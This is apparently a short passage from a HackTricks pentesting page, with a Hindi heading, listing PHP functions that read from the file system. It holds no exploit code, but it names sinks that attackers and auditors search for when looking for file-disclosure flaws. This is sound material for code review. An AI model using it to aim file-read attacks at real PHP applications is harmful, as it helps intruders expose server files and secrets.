**फाइल सिस्टम से पढ़ें**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
{{#include ../../../../banners/hacktricks-training.md}}
